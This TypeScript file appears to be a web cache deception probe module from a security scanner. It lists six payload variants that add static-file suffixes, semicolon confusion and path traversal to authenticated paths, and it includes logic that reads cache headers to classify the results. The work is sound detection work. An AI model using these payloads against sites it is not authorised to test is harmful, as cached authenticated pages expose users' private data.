// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'cache-deception',
  family: 'cache-deception',
  title: 'Web cache deception',
  severity: 'high',
  destructiveRisk: 'none',
  requiresOast: false,
  requiresBrowser: false,
  insertionPointKinds: ['path'],
  expectedSignals: ['cache-hit-on-dynamic', 'sensitive-data-cached', 'cache-header-present'],
  cwe: [525],
};

export function variants(ctx: ProbeContext): PayloadVariant[] {
  const basePath = ctx.baseValue || '/account/profile';
  return [
    {
      id: 'cd-css-suffix',
      family: 'cache-deception',
      value: `${basePath}/pf-deception.css`,
      encoding: 'url',
      intent: 'Append .css to dynamic authenticated path — CDN may cache authenticated response',
      destructiveRisk: 'none',
      expectedSignals: ['cache-hit-on-dynamic', 'sensitive-data-cached'],
    },
    {
      id: 'cd-js-suffix',
      family: 'cache-deception',
      value: `${basePath}/pf-deception.js`,
      encoding: 'url',
      intent: 'Append .js to dynamic path — CDN caches the authenticated content',
      destructiveRisk: 'none',
      expectedSignals: ['cache-hit-on-dynamic'],
    },
    {
      id: 'cd-png-suffix',
      family: 'cache-deception',
      value: `${basePath}/pf-deception.png`,
      encoding: 'url',
      intent: 'Append .png suffix — image extensions often bypass auth checks in CDN rules',
      destructiveRisk: 'none',
      expectedSignals: ['cache-hit-on-dynamic'],
    },
    {
      id: 'cd-static-path',
      family: 'cache-deception',
      value: `${basePath};/static/pf-deception.css`,
      encoding: 'url',
      intent: 'Semicolon path confusion — back-end sees original path, CDN keys on static suffix',
      destructiveRisk: 'none',
      expectedSignals: ['cache-hit-on-dynamic', 'sensitive-data-cached'],
    },
    {
      id: 'cd-path-parameter',
      family: 'cache-deception',
      value: `${basePath}%3Bpf-deception.css`,
      encoding: 'double-url',
      intent: 'Double-encoded semicolon to confuse URL normalisation',
      destructiveRisk: 'none',
      expectedSignals: ['cache-hit-on-dynamic'],
    },
    {
      id: 'cd-slash-traversal',
      family: 'cache-deception',
      value: `${basePath}/../../static/pf-deception.css`,
      encoding: 'url',
      intent: 'Path traversal to static directory with CSS suffix',
      destructiveRisk: 'none',
      expectedSignals: ['cache-hit-on-dynamic'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const cacheHeader = resp.headers['x-cache'] ?? resp.headers['cf-cache-status'] ?? resp.headers['x-cache-status'] ?? '';
  const wasCached = /^HIT/i.test(cacheHeader);
  const hasCacheControl = resp.headers['cache-control'] ?? '';
  const isPubliclyCacheable = hasCacheControl.includes('public') || wasCached;
  const bodySimilarToBaseline = resp.bodyText.length > 0 && Math.abs(resp.bodyText.length - baseline.bodyText.length) < 500;

  if (wasCached && bodySimilarToBaseline && resp.statusCode === 200) {
    responseClass = 'expected-proof';
    confidence = 0.9;
    nextAction = 'promote-finding';
    evidence.push(`Cache deception: authenticated response served from cache for ${variant.id}`);
    evidence.push(`Cache status: "${cacheHeader}"`);
    evidence.push('Sensitive user data may be cached and accessible without authentication');
  } else if (isPubliclyCacheable && resp.statusCode === 200) {
    responseClass = 'observed-value';
    confidence = 0.6;
    nextAction = 'confirm';
    evidence.push(`Response is publicly cacheable (Cache-Control: ${hasCacheControl}) for authenticated path variant`);
  } else if (resp.statusCode === 404 || resp.statusCode === 400) {
    responseClass = 'method-or-parser-rejected';
    confidence = 0.8;
    nextAction = 'stop-negative';
    evidence.push(`${resp.statusCode} — deception path rejected`);
  } else {
    nextAction = 'continue';
    evidence.push('No cache deception signal from this variant');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
